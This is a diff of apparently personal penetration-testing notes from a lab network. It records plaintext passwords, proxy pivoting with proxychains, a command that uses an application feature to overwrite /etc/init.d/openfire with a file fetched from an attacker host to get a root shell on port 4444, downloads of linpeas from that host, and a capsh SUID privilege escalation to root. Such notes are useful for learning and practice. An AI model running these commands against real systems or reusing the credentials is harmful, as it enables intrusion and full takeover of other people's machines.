@@ -783,11 +783,7 @@ passwd=ChangeMePlease__XMPPTest
 username=j.jones
 userid=j.jones
 passwd=ChangeMePlease__XMPPTest
-
-# get superadmin, then download openfire.txt
-@call abc -o /tmp/dummy -o /etc/init.d/openfire -X GET [http://192.168.45.214/openfire.txt](http://192.168.45.214/openfire.txt "http://192.168.45.214/openfire.txt") -o /tmp/dummy
 ```
-
 
 .223 (milan) (standalone)
 ```bash
@@ -932,6 +928,16 @@ http 192.168.194.224 3128 ext_acc DoNotShare!SkyLarkLegacyInternal2008
 # port 22 80 443
 sudo proxychains nmap -sT -A 172.16.124.32
 
+I_Miss_Windows3.1
+ssh legacy@192.168.194.224
+
+```
+
+.224 privesc
+```bash
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+wget http://192.168.45.229/linpeas.sh -O linpeas.sh
+
 ```
 
 .32
@@ -940,7 +946,7 @@ sudo proxychains nmap -sT -A 172.16.124.32
 
 sudo proxychains nmap -sT -A -p 80 172.16.124.32
 https://172.16.124.32/sipxconfig/app
-
+172.16.124.32
 # access webpage by setting firefox proxy to HTTP 192.168.194.224 3128 and nothing for socks
 
 userid=j.jameson
@@ -956,12 +962,22 @@ passwd=ChangeMePlease__XMPPTest
 @call abc -o /tmp/dummy -o /etc/init.d/openfire -X GET http://192.168.45.229/openfire -o /tmp/dummy
 # from the UI restart the im service
 # shell is caught on 4444 as root
+tcpdump -i ens192 udp -vvv
 
+# obtain creds for 30
+desktop:Deskt0pTermin4L
 ```
 
 .30
 ```bash
 # port 22, 3190
+# Deskt0pTermin4L
+proxychains ssh desktop@172.16.124.30
+wget http://192.168.45.229/linpeas.sh -O linpeas.sh
+
+# find suid binary from output /sbin/capsh
+https://ihsansencan.github.io/privilege-escalation/linux/binaries/capsh.html
+/sbin/capsh --gid=0 --uid=0 --
 
 ```
 
